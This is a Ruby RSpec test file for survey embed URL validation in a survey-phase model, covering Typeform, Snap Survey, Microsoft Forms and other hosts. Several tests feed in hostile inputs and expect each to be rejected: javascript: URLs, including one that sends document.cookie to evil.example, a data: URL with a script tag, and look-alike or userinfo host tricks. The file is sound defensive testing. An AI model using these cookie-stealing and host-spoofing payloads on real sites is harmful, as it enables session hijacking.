# frozen_string_literal: true

require 'rails_helper'

describe Surveys::SurveyPhase do
  describe 'validate survey_embed_url for typeform' do
    it 'validates a survey_embed_url' do
      pc = build(:typeform_survey_phase, survey_embed_url: 'https://citizenlabco.typeform.com/to/HKGaPV?source=xxxxx')
      expect(pc).to be_valid
    end

    it 'invalidates a survey_embed_url with a sole email parameter' do
      pc = build(:typeform_survey_phase, survey_embed_url: 'https://citizenlabco.typeform.com/to/HKGaPV?email=xxxxx')
      expect(pc).to be_invalid
    end

    it 'invalidates a survey_embed_url with email as one of the parameters' do
      pc = build(:typeform_survey_phase, survey_embed_url: 'https://citizenlabco.typeform.com/to/HKGaPV?email=xxxxx&source=yyyyyy')
      expect(pc).to be_invalid
    end
  end

  describe 'typeform_form_id method' do
    it 'returns correct ID for basic URL' do
      pc = build(:typeform_survey_phase, survey_embed_url: 'https://citizenlabco.typeform.com/to/HKGaPV')
      expect(pc.typeform_form_id).to eq 'HKGaPV'
    end

    it 'returns correct ID for URL with ? part' do
      pc = build(:typeform_survey_phase, survey_embed_url: 'https://citizenlabco.typeform.com/to/HKGaPV?source=xxxxx')
      expect(pc.typeform_form_id).to eq 'HKGaPV'
    end

    it 'returns correct ID for URL with # part' do
      pc = build(:typeform_survey_phase, survey_embed_url: 'https://citizenlabco.typeform.com/to/lVuW1Y18#user_id=xxxxx')
      expect(pc.typeform_form_id).to eq 'lVuW1Y18'
    end

    it 'returns correct ID for URL with # at the end' do
      pc = build(:typeform_survey_phase, survey_embed_url: 'https://citizenlabco.typeform.com/to/lVuW1Y18#')
      expect(pc.typeform_form_id).to eq 'lVuW1Y18'
    end
  end

  describe 'validate survey_embed_url for Enalyzer' do
    it 'validates a survey_embed_url' do
      pc = build(:enalyzer_survey_phase, survey_service: 'enalyzer', survey_embed_url: 'https://surveys.enalyzer.com/?pid=HKGaPV')
      expect(pc).to be_valid
      pc = build(:enalyzer_survey_phase, survey_service: 'enalyzer', survey_embed_url: 'https://surveys.enalyzer.com?pid=HKGaPV')
      expect(pc).to be_valid
    end

    it 'invalidates a survey_embed_url' do
      pc = build(:enalyzer_survey_phase, survey_service: 'enalyzer', survey_embed_url: 'https://surveys.enalyzer.com//?pid=HKGaPV')
      expect(pc).to be_invalid
    end
  end

  def survey_phase(service, url)
    build(:phase, participation_method: 'survey', survey_service: service, survey_embed_url: url)
  end

  describe 'validate survey_embed_url for Snap Survey' do
    it 'validates URLs on welcomesyourfeedback.net and snapsurveys.com' do
      expect(survey_phase('snap_survey', 'https://acme.welcomesyourfeedback.net/s/abc123')).to be_valid
      expect(survey_phase('snap_survey', 'https://acme.welcomesyourfeedback.net?id=abc123')).to be_valid
      expect(survey_phase('snap_survey', 'https://snapsurveys.com/wh/s.asp?k=abc123')).to be_valid
      expect(survey_phase('snap_survey', 'https://online.snapsurveys.com/wh/s.asp?k=abc123')).to be_valid
    end

    it 'invalidates javascript: URLs that end with snapsurveys.com/ (GV-04)' do
      expect(survey_phase('snap_survey', 'javascript:alert(document.cookie)//snapsurveys.com/')).to be_invalid
      expect(survey_phase('snap_survey', "javascript:fetch('//evil.example/'+document.cookie)//x.snapsurveys.com/")).to be_invalid
    end

    it 'invalidates other schemes and hosts' do
      expect(survey_phase('snap_survey', 'http://acme.welcomesyourfeedback.net/s/abc123')).to be_invalid
      expect(survey_phase('snap_survey', 'data:text/html,<script>alert(1)</script>snapsurveys.com/')).to be_invalid
      expect(survey_phase('snap_survey', 'https://evil.example/snapsurveys.com/')).to be_invalid
      expect(survey_phase('snap_survey', 'https://evil.example/x.welcomesyourfeedback.net/')).to be_invalid
      expect(survey_phase('snap_survey', 'https://snapsurveys.com.evil.example/')).to be_invalid
      expect(survey_phase('snap_survey', 'https://evilsnapsurveys.com/')).to be_invalid
      expect(survey_phase('snap_survey', 'https://acme.welcomesyourfeedbackXnet/')).to be_invalid
      expect(survey_phase('snap_survey', 'https://snapsurveys.com@evil.example/')).to be_invalid
    end
  end

  describe 'survey_embed_url host checks for the other services' do
    {
      'typeform' => 'https://citizenlabco.typeform.com/to/HKGaPV',
      'google_forms' => 'https://docs.google.com/forms/d/e/fake/viewform?embedded=true',
      'enalyzer' => 'https://surveys.enalyzer.com?pid=HKGaPV',
      'qualtrics' => 'https://acme.eu.qualtrics.com/jfe/form/SV_abc123',
      'survey_monkey' => 'https://widget.surveymonkey.com/collect/website/js/abc123.js',
      'survey_xact' => 'https://www.survey-xact.dk/LinkCollector?key=abc123',
      'smart_survey' => 'https://www.smartsurvey.co.uk/s/LU3JMS/',
      'microsoft_forms' => 'https://forms.office.com/e/HKGaPV'
    }.each do |service, valid_url|
      it "validates a regular #{service} URL" do
        expect(survey_phase(service, valid_url)).to be_valid
      end
    end

    it 'invalidates Typeform and Qualtrics URLs whose host is not on their domain' do
      expect(survey_phase('typeform', 'https://evil.example/x.typeform.com/to/HKGaPV')).to be_invalid
      expect(survey_phase('typeform', 'https://evil.example?x.typeform.com/to/HKGaPV')).to be_invalid
      expect(survey_phase('typeform', 'https://x.typeform.com@evil.example/x.typeform.com/to/HKGaPV')).to be_invalid
      expect(survey_phase('qualtrics', 'https://evil.example/x.qualtrics.com/jfe/form/SV_abc123')).to be_invalid
    end

    it 'invalidates Google Forms and Enalyzer look-alike hosts' do
      expect(survey_phase('google_forms', 'https://docs-google.com/forms/d/e/fake/viewform?embedded=true')).to be_invalid
      expect(survey_phase('enalyzer', 'https://surveys-enalyzer.com?pid=HKGaPV')).to be_invalid
    end

    it 'invalidates Microsoft Forms URLs with a line break' do
      expect(survey_phase('microsoft_forms', "https://forms.office.com/\njavascript:alert(1)")).to be_invalid
    end
  end

  describe 'validate survey_embed_url for Microsoft Forms' do
    def microsoft_forms_phase(url)
      build(:phase, participation_method: 'survey', survey_service: 'microsoft_forms', survey_embed_url: url)
    end

    it 'validates URLs on the cloud.microsoft domain' do
      expect(microsoft_forms_phase('https://forms.cloud.microsoft/Pages/ResponsePage.aspx?id=HKGaPV')).to be_valid
      expect(microsoft_forms_phase('https://forms.cloud.microsoft/e/HKGaPV')).to be_valid
    end

    it 'validates URLs on the legacy office.com and microsoft.com domains' do
      expect(microsoft_forms_phase('https://forms.office.com/Pages/ResponsePage.aspx?id=HKGaPV')).to be_valid
      expect(microsoft_forms_phase('https://forms.office.com/e/HKGaPV')).to be_valid
      expect(microsoft_forms_phase('https://forms.microsoft.com/e/HKGaPV')).to be_valid
    end

    it 'invalidates URLs on other domains' do
      expect(microsoft_forms_phase('https://forms.example.com/e/HKGaPV')).to be_invalid
      expect(microsoft_forms_phase('http://forms.cloud.microsoft/e/HKGaPV')).to be_invalid
    end

    it 'invalidates URLs that only mention a Microsoft host outside the host part' do
      expect(microsoft_forms_phase('https://evil.example/?next=forms.office.com/e/HKGaPV')).to be_invalid
    end
  end
end
